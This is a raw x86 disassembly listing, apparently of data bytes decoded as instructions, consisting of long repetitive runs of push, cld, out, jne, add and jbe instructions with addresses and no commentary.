  441fe2:	push   DWORD PTR [ebp+0x2b]
  441fe5:	cld    
  441fe6:	push   DWORD PTR [ebp+0x2b]
  441fe9:	cld    
  441fea:	push   DWORD PTR [ebp+0x2b]
  441fed:	cld    
  441fee:	push   DWORD PTR [ebp+0x2b]
  441ff1:	cld    
  441ff2:	push   DWORD PTR [ebp+0x2b]
  441ff5:	cld    
  441ff6:	push   DWORD PTR [ebp+0x2b]
  441ff9:	cld    
  441ffa:	push   DWORD PTR [ebp+0x2b]
  441ffd:	cld    
  441ffe:	push   DWORD PTR [ebp+0x2b]
  442001:	cld    
  442002:	push   DWORD PTR [ebp+0x2b]
  442005:	cld    
  442006:	push   DWORD PTR [ebp+0x2b]
  442009:	cld    
  44200a:	push   DWORD PTR [ebp+0x2b]
  44200d:	cld    
  44200e:	push   DWORD PTR [ebp+0x2b]
  442011:	cld    
  442012:	push   DWORD PTR [ebp+0x29]
  442015:	cld    
  442016:	push   DWORD PTR [ebp+0x29]
  442019:	cld    
  44201a:	push   DWORD PTR [ebp+0x29]
  44201d:	cld    
  44201e:	push   DWORD PTR [ebp+0x29]
  442021:	cld    
  442022:	push   DWORD PTR [ebp+0x29]
  442025:	cld    
  442026:	inc    DWORD PTR [eax]
  442028:	add    BYTE PTR [eax],al
  44202a:	add    BYTE PTR [eax],al
  44202c:	jne    0x442057
  44202e:	cld    
  44202f:	push   DWORD PTR [ebp+0x29]
  442032:	cld    
  442033:	push   DWORD PTR [ebp+0x29]
  442036:	cld    
  442037:	push   DWORD PTR [ebp+0x29]
  44203a:	cld    
  44203b:	push   DWORD PTR [ebp+0x29]
  44203e:	cld    
  44203f:	push   DWORD PTR [ebp+0x29]
  442042:	cld    
  442043:	push   DWORD PTR [ebp+0x2]
  442046:	out    0x3,eax
  442048:	jne    0x44204c
  44204a:	out    0x3,eax
  44204c:	jne    0x442050
  44204e:	out    0x3,eax
  442050:	jne    0x442054
  442052:	out    0x3,eax
  442054:	jne    0x442058
  442056:	out    0x3,eax
  442058:	jne    0x44205c
  44205a:	out    0x3,eax
  44205c:	jne    0x442060
  44205e:	out    0x3,eax
  442060:	jne    0x442064
  442062:	out    0x3,eax
  442064:	jne    0x442068
  442066:	out    0x3,eax
  442068:	jne    0x44206c
  44206a:	out    0x3,eax
  44206c:	jne    0x442070
  44206e:	out    0x3,eax
  442070:	jne    0x442074
  442072:	out    0x3,eax
  442074:	jne    0x442078
  442076:	out    0x3,eax
  442078:	jne    0x44207c
  44207a:	out    0x3,eax
  44207c:	jne    0x442080
  44207e:	out    0x3,eax
  442080:	jne    0x442084
  442082:	out    0x3,eax
  442084:	jne    0x442088
  442086:	out    0x3,eax
  442088:	jne    0x44208c
  44208a:	out    0x3,eax
  44208c:	jne    0x442090
  44208e:	out    0x3,eax
  442090:	add    BYTE PTR [eax],al
  442092:	add    BYTE PTR [eax],al
  442094:	add    BYTE PTR [ebp+0x2],dh
  442097:	out    0x3,eax
  442099:	jne    0x44209d
  44209b:	out    0x3,eax
  44209d:	jne    0x4420a1
  44209f:	out    0x3,eax
  4420a1:	jne    0x4420a5
  4420a3:	out    0x3,eax
  4420a5:	jne    0x4420a9
  4420a7:	out    0x3,eax
  4420a9:	jne    0x4420ad
  4420ab:	out    0x3,eax
  4420ad:	jne    0x4420b1
  4420af:	out    0x3,eax
  4420b1:	jne    0x4420b5
  4420b3:	out    0x3,eax
  4420b5:	jne    0x4420b9
  4420b7:	out    0x3,eax
  4420b9:	jne    0x4420bd
  4420bb:	out    0x3,eax
  4420bd:	jne    0x4420c1
  4420bf:	out    0x3,eax
  4420c1:	jne    0x4420c5
  4420c3:	add    cl,ch
  4420c5:	jbe    0x4420c9
  4420c7:	add    cl,ch
  4420c9:	jbe    0x4420cd
  4420cb:	add    cl,ch
  4420cd:	jbe    0x4420d1
  4420cf:	add    cl,ch
  4420d1:	jbe    0x4420d5
  4420d3:	add    cl,ch
  4420d5:	jbe    0x4420d9
  4420d7:	add    cl,ch
  4420d9:	jbe    0x4420dd
  4420db:	add    cl,ch
  4420dd:	jbe    0x4420e1
  4420df:	add    cl,ch
  4420e1:	jbe    0x4420e5
  4420e3:	add    cl,ch
  4420e5:	jbe    0x4420e9
  4420e7:	add    cl,ch
  4420e9:	jbe    0x4420ed
  4420eb:	add    cl,ch
  4420ed:	jbe    0x4420f1
  4420ef:	add    cl,ch
  4420f1:	jbe    0x4420f5
  4420f3:	add    cl,ch
  4420f5:	jbe    0x4420f9
  4420f7:	add    cl,ch
  4420f9:	add    BYTE PTR [eax],al
  4420fb:	add    BYTE PTR [eax],al
  4420fd:	add    BYTE PTR [esi+0x2],dh
  442100:	add    cl,ch
  442102:	jbe    0x442106
  442104:	add    cl,ch
  442106:	jbe    0x44210a
  442108:	add    cl,ch
  44210a:	jbe    0x44210e
  44210c:	add    cl,ch
  44210e:	jbe    0x442112
  442110:	add    cl,ch
  442112:	jbe    0x442116
  442114:	add    cl,ch
  442116:	jbe    0x44211a
  442118:	add    cl,ch
  44211a:	jbe    0x44211e
  44211c:	add    cl,ch
  44211e:	jbe    0x442122
  442120:	add    cl,ch
  442122:	jbe    0x442126
  442124:	add    cl,ch
  442126:	jbe    0x44212a
  442128:	add    cl,ch
  44212a:	jbe    0x44212e
  44212c:	add    cl,ch
  44212e:	jbe    0x442132
  442130:	add    cl,ch
  442132:	jbe    0x442136
  442134:	add    cl,ch
  442136:	jbe    0x44213a
  442138:	add    cl,ch
  44213a:	jbe    0x44213e
  44213c:	add    cl,ch
  44213e:	jbe    0x442142
  442140:	add    BYTE PTR [eax],al
  442142:	sbb    al,0x2
  442144:	add    BYTE PTR [eax],al
  442146:	sbb    al,0x2
  442148:	add    BYTE PTR [eax],al
  44214a:	or     al,0x2
  44214c:	add    BYTE PTR [eax],al
  44214e:	or     al,0x2
  442150:	add    BYTE PTR [eax],al
  442152:	sbb    al,0x2
  442154:	add    BYTE PTR [eax],al
  442156:	sbb    al,0x2
  442158:	add    BYTE PTR [eax],al
  44215a:	or     al,0x2
  44215c:	add    BYTE PTR [eax],al
  44215e:	or     al,0x2
  442160:	add    BYTE PTR [eax],al
  442162:	add    BYTE PTR [eax],al
  442164:	add    BYTE PTR [eax],al
  442166:	add    ah,bl
  442168:	add    DWORD PTR [eax],eax
  44216a:	add    ah,bl
  44216c:	add    DWORD PTR [eax],eax
  44216e:	add    ah,cl
  442170:	add    DWORD PTR [eax],eax
  442172:	add    ah,cl
  442174:	add    DWORD PTR [eax],eax
  442176:	add    ah,bl
  442178:	add    DWORD PTR [eax],eax
  44217a:	add    ah,bl
  44217c:	add    DWORD PTR [eax],eax
  44217e:	add    ah,cl
  442180:	add    DWORD PTR [eax],eax
  442182:	add    ah,cl
  442184:	add    DWORD PTR [eax],eax
  442186:	add    BYTE PTR [ecx+eax*1+0x19c0000],bl
  44218d:	add    BYTE PTR [eax],al
  44218f:	mov    WORD PTR [ecx],es
  442191:	add    BYTE PTR [eax],al
  442193:	mov    WORD PTR [ecx],es
  442195:	add    BYTE PTR [eax],al
  442197:	pushf  
  442198:	add    DWORD PTR [eax],eax
  44219a:	add    BYTE PTR [ecx+eax*1+0x18c0000],bl
  4421a1:	add    BYTE PTR [eax],al
  4421a3:	mov    WORD PTR [ecx],es
  4421a5:	add    BYTE PTR [eax],al
  4421a7:	pop    esp
  4421a8:	add    DWORD PTR [eax],eax
  4421aa:	add    BYTE PTR [ecx+eax*1+0x0],bl
  4421ae:	add    BYTE PTR [ecx+eax*1+0x0],cl
  4421b2:	add    BYTE PTR [ecx+eax*1+0x0],cl
  4421b6:	add    BYTE PTR [ecx+eax*1+0x0],bl
  4421ba:	add    BYTE PTR [ecx+eax*1+0x0],bl
  4421be:	add    BYTE PTR [ebp+0x2b],dh
  4421c1:	cld    
  4421c2:	push   DWORD PTR [ebp+0x2b]
  4421c5:	cld    
  4421c6:	push   DWORD PTR [ebp+0x2b]
  4421c9:	cld    
  4421ca:	inc    DWORD PTR [eax]
  4421cc:	add    BYTE PTR [eax],al
  4421ce:	add    BYTE PTR [eax],al
  4421d0:	jne    0x4421fd
  4421d2:	cld    
  4421d3:	push   DWORD PTR [ebp+0x2b]
  4421d6:	cld    
  4421d7:	push   DWORD PTR [ebp+0x2b]
  4421da:	cld    
  4421db:	push   DWORD PTR [ebp+0x2b]
  4421de:	cld    
  4421df:	push   DWORD PTR [ebp+0x2b]
  4421e2:	cld    
  4421e3:	push   DWORD PTR [ebp+0x2b]
  4421e6:	cld    
  4421e7:	push   DWORD PTR [ebp+0x2b]
  4421ea:	cld    
  4421eb:	push   DWORD PTR [ebp+0x2b]
  4421ee:	cld    
  4421ef:	push   DWORD PTR [ebp+0x2b]
  4421f2:	cld    
  4421f3:	push   DWORD PTR [ebp+0x2b]
  4421f6:	cld    
  4421f7:	push   DWORD PTR [ebp+0x2b]
  4421fa:	cld    
  4421fb:	push   DWORD PTR [ebp+0x2b]
  4421fe:	cld    
  4421ff:	push   DWORD PTR [ebp+0x2b]
  442202:	cld    
  442203:	push   DWORD PTR [ebp+0x2b]
  442206:	cld    
  442207:	push   DWORD PTR [ebp+0x2b]
  44220a:	cld    
  44220b:	push   DWORD PTR [ebp+0x2b]
  44220e:	cld    
  44220f:	push   DWORD PTR [ebp+0x2b]
  442212:	cld    
  442213:	push   DWORD PTR [ebp+0x2b]
  442216:	cld    
  442217:	push   DWORD PTR [ebp+0x2b]
  44221a:	cld    
  44221b:	push   DWORD PTR [ebp+0x2b]
  44221e:	cld    
  44221f:	push   DWORD PTR [ebp+0x2b]
  442222:	cld    
  442223:	push   DWORD PTR [ebp+0x2b]
  442226:	cld    
  442227:	push   DWORD PTR [ebp+0x2b]
  44222a:	cld    
  44222b:	push   DWORD PTR [ebp+0x29]
  44222e:	cld    
  44222f:	push   DWORD PTR [ebp+0x29]
  442232:	cld    
  442233:	inc    DWORD PTR [eax]
  442235:	add    BYTE PTR [eax],al
  442237:	add    BYTE PTR [eax],al
  442239:	jne    0x442264
  44223b:	cld    
  44223c:	push   DWORD PTR [ebp+0x29]
  44223f:	cld    
  442240:	push   DWORD PTR [ebp+0x2]
  442243:	out    0x3,eax
  442245:	jne    0x442249
  442247:	out    0x3,eax
  442249:	jne    0x44224d
  44224b:	out    0x3,eax
  44224d:	jne    0x442251
  44224f:	out    0x3,eax
  442251:	jne    0x442255
  442253:	out    0x3,eax
  442255:	jne    0x442259
  442257:	out    0x3,eax
  442259:	jne    0x44225d
  44225b:	out    0x3,eax
  44225d:	jne    0x442261
  44225f:	out    0x3,eax
  442261:	jne    0x442265
  442263:	out    0x3,eax
  442265:	jne    0x442269
  442267:	out    0x3,eax
  442269:	jne    0x44226d
  44226b:	out    0x3,eax
  44226d:	jne    0x442271
  44226f:	out    0x3,eax
  442271:	jne    0x442275
  442273:	out    0x3,eax
  442275:	jne    0x442279
  442277:	out    0x3,eax
  442279:	jne    0x44227d
  44227b:	out    0x3,eax
  44227d:	jne    0x442281
  44227f:	out    0x3,eax
  442281:	jne    0x442285
  442283:	out    0x3,eax
  442285:	jne    0x442289
  442287:	out    0x3,eax
  442289:	jne    0x44228d
  44228b:	out    0x3,eax
  44228d:	jne    0x442291
  44228f:	out    0x3,eax
  442291:	jne    0x442295
  442293:	out    0x3,eax
  442295:	jne    0x442299
  442297:	out    0x3,eax
  442299:	jne    0x44229d
  44229b:	out    0x3,eax
  44229d:	add    BYTE PTR [eax],al
  44229f:	add    BYTE PTR [eax],al
  4422a1:	add    BYTE PTR [ebp+0x2],dh
  4422a4:	out    0x3,eax
  4422a6:	jne    0x4422aa
  4422a8:	out    0x3,eax
  4422aa:	jne    0x4422ae
  4422ac:	out    0x3,eax
  4422ae:	jne    0x4422b2
  4422b0:	out    0x3,eax
  4422b2:	jne    0x4422b6
  4422b4:	out    0x3,eax
  4422b6:	jne    0x4422ba
  4422b8:	out    0x3,eax
  4422ba:	jne    0x4422be
  4422bc:	out    0x3,eax
  4422be:	jne    0x4422c2
  4422c0:	add    cl,ch
  4422c2:	jbe    0x4422c6
  4422c4:	add    cl,ch
  4422c6:	jbe    0x4422ca
  4422c8:	add    cl,ch
  4422ca:	jbe    0x4422ce
  4422cc:	add    cl,ch
  4422ce:	jbe    0x4422d2
  4422d0:	add    cl,ch
  4422d2:	jbe    0x4422d6
  4422d4:	add    cl,ch
  4422d6:	jbe    0x4422da
  4422d8:	add    cl,ch
  4422da:	jbe    0x4422de
  4422dc:	add    cl,ch
  4422de:	jbe    0x4422e2
  4422e0:	add    cl,ch
  4422e2:	jbe    0x4422e6
  4422e4:	add    cl,ch
  4422e6:	jbe    0x4422ea
  4422e8:	add    cl,ch
  4422ea:	jbe    0x4422ee
  4422ec:	add    cl,ch
  4422ee:	jbe    0x4422f2
  4422f0:	add    cl,ch
  4422f2:	jbe    0x4422f6
  4422f4:	add    cl,ch
  4422f6:	jbe    0x4422fa
  4422f8:	add    cl,ch
  4422fa:	jbe    0x4422fe
  4422fc:	add    cl,ch
  4422fe:	jbe    0x442302
  442300:	add    cl,ch
  442302:	jbe    0x442306
  442304:	add    cl,ch
  442306:	add    BYTE PTR [eax],al
  442308:	add    BYTE PTR [eax],al
  44230a:	add    BYTE PTR [esi+0x2],dh
  44230d:	add    cl,ch
  44230f:	jbe    0x442313
  442311:	add    cl,ch
  442313:	jbe    0x442317
  442315:	add    cl,ch
  442317:	jbe    0x44231b
  442319:	add    cl,ch
  44231b:	jbe    0x44231f
  44231d:	add    cl,ch
  44231f:	jbe    0x442323
  442321:	add    cl,ch
  442323:	jbe    0x442327
  442325:	add    cl,ch
  442327:	jbe    0x44232b
  442329:	add    cl,ch
  44232b:	jbe    0x44232f
  44232d:	add    cl,ch
  44232f:	jbe    0x442333
  442331:	add    cl,ch
  442333:	jbe    0x442337
  442335:	add    cl,ch
  442337:	jbe    0x44233b
  442339:	add    cl,ch
  44233b:	jbe    0x44233f
  44233d:	add    BYTE PTR [eax],al
  44233f:	pop    esp
  442340:	push   es
  442341:	add    BYTE PTR [eax],al
  442343:	dec    esp
  442344:	push   es
  442345:	add    BYTE PTR [eax],al
  442347:	dec    esp
  442348:	push   es
  442349:	add    BYTE PTR [eax],al
  44234b:	pop    esp
  44234c:	push   es
  44234d:	add    BYTE PTR [eax],al
  44234f:	pop    esp
  442350:	push   es
  442351:	add    BYTE PTR [eax],al
  442353:	dec    esp
  442354:	push   es
  442355:	add    BYTE PTR [eax],al
  442357:	dec    esp
  442358:	push   es
  442359:	add    BYTE PTR [eax],al
  44235b:	sbb    al,0x6
  44235d:	add    BYTE PTR [eax],al
  44235f:	sbb    al,0x6
  442361:	add    BYTE PTR [eax],al
  442363:	or     al,0x6
  442365:	add    BYTE PTR [eax],al
  442367:	or     al,0x6
  442369:	add    BYTE PTR [eax],al
  44236b:	sbb    al,0x6
  44236d:	add    BYTE PTR [eax],al
  44236f:	add    BYTE PTR [eax],al
  442371:	add    BYTE PTR [eax],al
  442373:	add    BYTE PTR [esi+eax*1],bl
  442376:	add    BYTE PTR [eax],al
  442378:	or     al,0x6
  44237a:	add    BYTE PTR [eax],al
  44237c:	or     al,0x6
  44237e:	add    BYTE PTR [eax],al
  442380:	fadd   QWORD PTR ds:0x5dc0000
  442386:	add    BYTE PTR [eax],al
  442388:	int3   
  442389:	add    eax,0x5cc0000
  44238e:	add    BYTE PTR [eax],al
  442390:	fadd   QWORD PTR ds:0x5dc0000
  442396:	add    BYTE PTR [eax],al
  442398:	int3   
  442399:	add    eax,0x5cc0000
  44239e:	add    BYTE PTR [eax],al
  4423a0:	pushf  
  4423a1:	add    eax,0x59c0000
  4423a6:	add    BYTE PTR [eax],al
  4423a8:	mov    WORD PTR ds:0x58c0000,es
  4423ae:	add    BYTE PTR [eax],al
  4423b0:	pushf  
  4423b1:	add    eax,0x59c0000
  4423b6:	add    BYTE PTR [eax],al
  4423b8:	mov    WORD PTR ds:0x2b750000,es
  4423be:	cld    
  4423bf:	push   DWORD PTR [ebp+0x2b]
  4423c2:	cld    
  4423c3:	push   DWORD PTR [ebp+0x2b]
  4423c6:	cld    
  4423c7:	push   DWORD PTR [ebp+0x2b]
  4423ca:	cld    
  4423cb:	push   DWORD PTR [ebp+0x2b]
  4423ce:	cld    
  4423cf:	push   DWORD PTR [ebp+0x2b]
  4423d2:	cld    
  4423d3:	push   DWORD PTR [ebp+0x2b]
  4423d6:	cld    
  4423d7:	inc    DWORD PTR [eax]
  4423d9:	add    BYTE PTR [eax],al
  4423db:	add    BYTE PTR [eax],al
  4423dd:	jne    0x44240a
  4423df:	cld    
  4423e0:	push   DWORD PTR [ebp+0x2b]
  4423e3:	cld    
  4423e4:	push   DWORD PTR [ebp+0x2b]
  4423e7:	cld    
  4423e8:	push   DWORD PTR [ebp+0x2b]
  4423eb:	cld    
  4423ec:	push   DWORD PTR [ebp+0x2b]
  4423ef:	cld    
  4423f0:	push   DWORD PTR [ebp+0x2b]
  4423f3:	cld    
  4423f4:	push   DWORD PTR [ebp+0x2b]
  4423f7:	cld    
  4423f8:	push   DWORD PTR [ebp+0x2b]
  4423fb:	cld    
  4423fc:	push   DWORD PTR [ebp+0x2b]
  4423ff:	cld    
  442400:	push   DWORD PTR [ebp+0x2b]
  442403:	cld    
  442404:	push   DWORD PTR [ebp+0x2b]
  442407:	cld    
  442408:	push   DWORD PTR [ebp+0x2b]
  44240b:	cld    
  44240c:	push   DWORD PTR [ebp+0x2b]
  44240f:	cld    
  442410:	push   DWORD PTR [ebp+0x2b]
  442413:	cld    
  442414:	push   DWORD PTR [ebp+0x2b]
  442417:	cld    
  442418:	push   DWORD PTR [ebp+0x2b]
  44241b:	cld    
  44241c:	push   DWORD PTR [ebp+0x2b]
  44241f:	cld    
  442420:	push   DWORD PTR [ebp+0x2b]
  442423:	cld    
  442424:	push   DWORD PTR [ebp+0x2b]
  442427:	cld    
  442428:	push   DWORD PTR [ebp+0x2b]
  44242b:	cld    
  44242c:	push   DWORD PTR [ebp+0x2b]
  44242f:	cld    
  442430:	push   DWORD PTR [ebp+0x2b]
  442433:	cld    
  442434:	push   DWORD PTR [ebp+0x2b]
  442437:	cld    
  442438:	push   DWORD PTR [ebp+0x2]
  44243b:	out    0x3,eax
  44243d:	jne    0x442441
  44243f:	out    0x3,eax
  442441:	add    BYTE PTR [eax],al
  442443:	add    BYTE PTR [eax],al
  442445:	add    BYTE PTR [ebp+0x2],dh
  442448:	out    0x3,eax
  44244a:	jne    0x44244e
  44244c:	out    0x3,eax
  44244e:	jne    0x442452
  442450:	out    0x3,eax
  442452:	jne    0x442456
  442454:	out    0x3,eax
  442456:	jne    0x44245a
  442458:	out    0x3,eax
  44245a:	jne    0x44245e
  44245c:	out    0x3,eax
  44245e:	jne    0x442462
  442460:	out    0x3,eax
  442462:	jne    0x442466
  442464:	out    0x3,eax
  442466:	jne    0x44246a
  442468:	out    0x3,eax
  44246a:	jne    0x44246e
  44246c:	out    0x3,eax
  44246e:	jne    0x442472
  442470:	out    0x3,eax
  442472:	jne    0x442476
  442474:	out    0x3,eax
  442476:	jne    0x44247a
  442478:	out    0x3,eax
  44247a:	jne    0x44247e
  44247c:	out    0x3,eax
  44247e:	jne    0x442482
  442480:	out    0x3,eax
  442482:	jne    0x442486
  442484:	out    0x3,eax
  442486:	jne    0x44248a
  442488:	out    0x3,eax
  44248a:	jne    0x44248e
  44248c:	out    0x3,eax
  44248e:	jne    0x442492
  442490:	out    0x3,eax
  442492:	jne    0x442496
  442494:	out    0x3,eax
  442496:	jne    0x44249a
  442498:	out    0x3,eax
  44249a:	jne    0x44249e
  44249c:	out    0x3,eax
  44249e:	jne    0x4424a2
  4424a0:	out    0x3,eax
  4424a2:	jne    0x4424a6
  4424a4:	out    0x3,eax
  4424a6:	jne    0x4424aa
  4424a8:	out    0x3,eax
  4424aa:	add    BYTE PTR [eax],al
  4424ac:	add    BYTE PTR [eax],al
  4424ae:	add    BYTE PTR [ebp+0x2],dh
  4424b1:	out    0x3,eax
  4424b3:	jne    0x4424b7
  4424b5:	out    0x3,eax
  4424b7:	jne    0x4424bb
  4424b9:	out    0x3,eax
  4424bb:	jne    0x4424bf
  4424bd:	add    cl,ch
  4424bf:	jbe    0x4424c3
  4424c1:	add    cl,ch
  4424c3:	jbe    0x4424c7
  4424c5:	add    cl,ch
  4424c7:	jbe    0x4424cb
  4424c9:	add    cl,ch
  4424cb:	jbe    0x4424cf
  4424cd:	add    cl,ch
  4424cf:	jbe    0x4424d3
  4424d1:	add    cl,ch
  4424d3:	jbe    0x4424d7
  4424d5:	add    cl,ch
  4424d7:	jbe    0x4424db
  4424d9:	add    cl,ch
  4424db:	jbe    0x4424df
  4424dd:	add    cl,ch
  4424df:	jbe    0x4424e3
  4424e1:	add    cl,ch
  4424e3:	jbe    0x4424e7
  4424e5:	add    cl,ch
  4424e7:	jbe    0x4424eb
  4424e9:	add    cl,ch
  4424eb:	jbe    0x4424ef
  4424ed:	add    cl,ch
  4424ef:	jbe    0x4424f3
  4424f1:	add    cl,ch
  4424f3:	jbe    0x4424f7
  4424f5:	add    cl,ch
  4424f7:	jbe    0x4424fb
  4424f9:	add    cl,ch
  4424fb:	jbe    0x4424ff
  4424fd:	add    cl,ch
  4424ff:	jbe    0x442503
  442501:	add    cl,ch
  442503:	jbe    0x442507
  442505:	add    cl,ch
  442507:	jbe    0x44250b
  442509:	add    cl,ch
  44250b:	jbe    0x44250f
  44250d:	add    cl,ch
  44250f:	jbe    0x442513
  442511:	add    cl,ch
  442513:	add    BYTE PTR [eax],al
  442515:	add    BYTE PTR [eax],al
  442517:	add    BYTE PTR [esi+0x2],dh
  44251a:	add    cl,ch
  44251c:	jbe    0x442520
  44251e:	add    cl,ch
  442520:	jbe    0x442524
  442522:	add    cl,ch
  442524:	jbe    0x442528
  442526:	add    cl,ch
  442528:	jbe    0x44252c
  44252a:	add    cl,ch
  44252c:	jbe    0x442530
  44252e:	add    cl,ch
  442530:	jbe    0x442534
  442532:	add    cl,ch
  442534:	jbe    0x442538
  442536:	add    cl,ch
  442538:	jbe    0x44253c
  44253a:	add    BYTE PTR [eax],al
  44253c:	mov    WORD PTR [edx],es
  44253e:	add    BYTE PTR [eax],al
  442540:	mov    WORD PTR [edx],es
  442542:	add    BYTE PTR [eax],al
  442544:	pushf  
  442545:	add    al,BYTE PTR [eax]
  442547:	add    BYTE PTR [edx+eax*1+0x28c0000],bl
  44254e:	add    BYTE PTR [eax],al
  442550:	mov    WORD PTR [edx],es
  442552:	add    BYTE PTR [eax],al
  442554:	pop    esp
  442555:	add    al,BYTE PTR [eax]
  442557:	add    BYTE PTR [edx+eax*1+0x0],bl
  44255b:	add    BYTE PTR [edx+eax*1+0x0],cl
  44255f:	add    BYTE PTR [edx+eax*1+0x0],cl
  442563:	add    BYTE PTR [edx+eax*1+0x0],bl
  442567:	add    BYTE PTR [edx+eax*1+0x0],bl
  44256b:	add    BYTE PTR [edx+eax*1+0x0],cl
  44256f:	add    BYTE PTR [edx+eax*1+0x0],cl
  442573:	add    BYTE PTR [edx+eax*1],bl
  442576:	add    BYTE PTR [eax],al
  442578:	sbb    al,0x2
  44257a:	add    BYTE PTR [eax],al
  44257c:	add    BYTE PTR [eax],al
  44257e:	add    BYTE PTR [eax],al
  442580:	add    BYTE PTR [edx+eax*1],cl
  442583:	add    BYTE PTR [eax],al
  442585:	or     al,0x2
  442587:	add    BYTE PTR [eax],al
  442589:	sbb    al,0x2
  44258b:	add    BYTE PTR [eax],al
  44258d:	sbb    al,0x2
  44258f:	add    BYTE PTR [eax],al
  442591:	or     al,0x2
  442593:	add    BYTE PTR [eax],al
  442595:	or     al,0x2
  442597:	add    BYTE PTR [eax],al
  442599:	fadd   QWORD PTR [ecx]
  44259b:	add    BYTE PTR [eax],al
  44259d:	fadd   QWORD PTR [ecx]
  44259f:	add    BYTE PTR [eax],al
  4425a1:	int3   
  4425a2:	add    DWORD PTR [eax],eax
  4425a4:	add    ah,cl
  4425a6:	add    DWORD PTR [eax],eax
  4425a8:	add    ah,bl
  4425aa:	add    DWORD PTR [eax],eax
  4425ac:	add    ah,bl
  4425ae:	add    DWORD PTR [eax],eax
  4425b0:	add    ah,cl
  4425b2:	add    DWORD PTR [eax],eax
  4425b4:	add    ah,cl
  4425b6:	add    DWORD PTR [eax],eax
  4425b8:	add    BYTE PTR [ebp+0x2b],dh
  4425bb:	cld    
  4425bc:	push   DWORD PTR [ebp+0x2b]
  4425bf:	cld    
  4425c0:	push   DWORD PTR [ebp+0x2b]
  4425c3:	cld    
  4425c4:	push   DWORD PTR [ebp+0x2b]
  4425c7:	cld    
  4425c8:	push   DWORD PTR [ebp+0x2b]
  4425cb:	cld    
  4425cc:	push   DWORD PTR [ebp+0x2b]
  4425cf:	cld    
  4425d0:	push   DWORD PTR [ebp+0x2b]
  4425d3:	cld    
  4425d4:	push   DWORD PTR [ebp+0x2b]
  4425d7:	cld    
  4425d8:	push   DWORD PTR [ebp+0x2b]
  4425db:	cld    
  4425dc:	push   DWORD PTR [ebp+0x2b]
  4425df:	cld    
  4425e0:	push   DWORD PTR [ebp+0x2b]
  4425e3:	cld    
  4425e4:	inc    DWORD PTR [eax]
  4425e6:	add    BYTE PTR [eax],al
  4425e8:	add    BYTE PTR [eax],al
  4425ea:	jne    0x442617
  4425ec:	cld    
  4425ed:	push   DWORD PTR [ebp+0x2b]
  4425f0:	cld    
  4425f1:	push   DWORD PTR [ebp+0x2b]
  4425f4:	cld    
  4425f5:	push   DWORD PTR [ebp+0x2b]
  4425f8:	cld    
  4425f9:	push   DWORD PTR [ebp+0x2b]
  4425fc:	cld    
  4425fd:	push   DWORD PTR [ebp+0x2b]
  442600:	cld    
  442601:	push   DWORD PTR [ebp+0x2b]
  442604:	cld    
  442605:	push   DWORD PTR [ebp+0x2b]
  442608:	cld    
  442609:	push   DWORD PTR [ebp+0x2b]
  44260c:	cld    
  44260d:	push   DWORD PTR [ebp+0x2b]
  442610:	cld    
  442611:	push   DWORD PTR [ebp+0x2b]
  442614:	cld    
  442615:	push   DWORD PTR [ebp+0x2b]
  442618:	cld    
  442619:	push   DWORD PTR [ebp+0x2b]
  44261c:	cld    
  44261d:	push   DWORD PTR [ebp+0x2b]
  442620:	cld    
  442621:	push   DWORD PTR [ebp+0x2b]
  442624:	cld    
  442625:	push   DWORD PTR [ebp+0x2b]
  442628:	cld    
  442629:	push   DWORD PTR [ebp+0x2b]
  44262c:	cld    
  44262d:	push   DWORD PTR [ebp+0x2b]
  442630:	cld    
  442631:	push   DWORD PTR [ebp+0x2b]
  442634:	cld    
  442635:	push   DWORD PTR [ebp+0x2]
  442638:	out    0x3,eax
  44263a:	jne    0x44263e
  44263c:	out    0x3,eax
  44263e:	jne    0x442642
  442640:	out    0x3,eax
  442642:	jne    0x442646
  442644:	out    0x3,eax
  442646:	jne    0x44264a
  442648:	out    0x3,eax
  44264a:	jne    0x44264e
  44264c:	out    0x3,eax
  44264e:	add    BYTE PTR [eax],al
  442650:	add    BYTE PTR [eax],al
  442652:	add    BYTE PTR [ebp+0x2],dh
  442655:	out    0x3,eax
  442657:	jne    0x44265b
  442659:	out    0x3,eax
  44265b:	jne    0x44265f
  44265d:	out    0x3,eax
  44265f:	jne    0x442663
  442661:	out    0x3,eax
  442663:	jne    0x442667
  442665:	out    0x3,eax
  442667:	jne    0x44266b
  442669:	out    0x3,eax
  44266b:	jne    0x44266f
  44266d:	out    0x3,eax
  44266f:	jne    0x442673
  442671:	out    0x3,eax
  442673:	jne    0x442677
  442675:	out    0x3,eax
  442677:	jne    0x44267b
  442679:	out    0x3,eax
  44267b:	jne    0x44267f
  44267d:	out    0x3,eax
  44267f:	jne    0x442683
  442681:	out    0x3,eax
  442683:	jne    0x442687
  442685:	out    0x3,eax
  442687:	jne    0x44268b
  442689:	out    0x3,eax
  44268b:	jne    0x44268f
  44268d:	out    0x3,eax
  44268f:	jne    0x442693
  442691:	out    0x3,eax
  442693:	jne    0x442697
  442695:	out    0x3,eax
  442697:	jne    0x44269b
  442699:	out    0x3,eax
  44269b:	jne    0x44269f
  44269d:	out    0x3,eax
  44269f:	jne    0x4426a3
  4426a1:	out    0x3,eax
  4426a3:	jne    0x4426a7
  4426a5:	out    0x3,eax
  4426a7:	jne    0x4426ab
  4426a9:	out    0x3,eax
  4426ab:	jne    0x4426af
  4426ad:	out    0x3,eax
  4426af:	jne    0x4426b3
  4426b1:	out    0x3,eax
  4426b3:	jne    0x4426b7
  4426b5:	add    cl,ch
  4426b7:	add    BYTE PTR [eax],al
  4426b9:	add    BYTE PTR [eax],al
  4426bb:	add    BYTE PTR [esi+0x2],dh
  4426be:	add    cl,ch
  4426c0:	jbe    0x4426c4
  4426c2:	add    cl,ch
  4426c4:	jbe    0x4426c8
  4426c6:	add    cl,ch
  4426c8:	jbe    0x4426cc
  4426ca:	add    cl,ch
  4426cc:	jbe    0x4426d0
  4426ce:	add    cl,ch
  4426d0:	jbe    0x4426d4
  4426d2:	add    cl,ch
  4426d4:	jbe    0x4426d8
  4426d6:	add    cl,ch
  4426d8:	jbe    0x4426dc
  4426da:	add    cl,ch
  4426dc:	jbe    0x4426e0
  4426de:	add    cl,ch
  4426e0:	jbe    0x4426e4
  4426e2:	add    cl,ch
  4426e4:	jbe    0x4426e8
  4426e6:	add    cl,ch
  4426e8:	jbe    0x4426ec
  4426ea:	add    cl,ch
  4426ec:	jbe    0x4426f0
  4426ee:	add    cl,ch
  4426f0:	jbe    0x4426f4
  4426f2:	add    cl,ch
  4426f4:	jbe    0x4426f8
  4426f6:	add    cl,ch
  4426f8:	jbe    0x4426fc
  4426fa:	add    cl,ch
  4426fc:	jbe    0x442700
  4426fe:	add    cl,ch
  442700:	jbe    0x442704
  442702:	add    cl,ch
  442704:	jbe    0x442708
